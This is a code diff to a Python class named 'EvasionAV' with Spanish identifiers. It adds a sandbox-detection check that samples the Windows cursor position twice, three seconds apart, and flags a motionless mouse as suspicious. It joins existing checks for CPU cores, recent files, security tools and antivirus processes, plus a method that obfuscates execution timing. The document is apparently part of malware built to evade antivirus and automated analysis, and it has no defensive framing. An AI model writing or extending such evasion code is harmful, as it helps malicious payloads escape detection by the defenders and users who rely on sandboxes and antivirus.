@@ -25,7 +25,8 @@ class EvasionAV:
             self._check_cpu_cores,
             self._check_recent_files,
             self._check_security_tools,
-            self._check_av_processes
+            self._check_av_processes,
+            self._check_mouse_clicks
         ]
         sospechoso = 0
         for check in checks:
@@ -173,6 +174,28 @@ class EvasionAV:
         except:
             pass
         return False
+    
+    def _check_mouse_clicks(self):
+        try:
+            import ctypes
+            import time as t
+            
+            class POINT(ctypes.Structure):
+                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+            
+            point1 = POINT()
+            ctypes.windll.user32.GetCursorPos(ctypes.byref(point1))
+            pos1 = (point1.x, point1.y)
+            
+            t.sleep(3)
+            
+            point2 = POINT()
+            ctypes.windll.user32.GetCursorPos(ctypes.byref(point2))
+            pos2 = (point2.x, point2.y)
+            
+            return pos1 == pos2
+        except:
+            return False
     
     def ofuscar_ejecucion(self):
         time.sleep(random.uniform(0.5, 1.5))
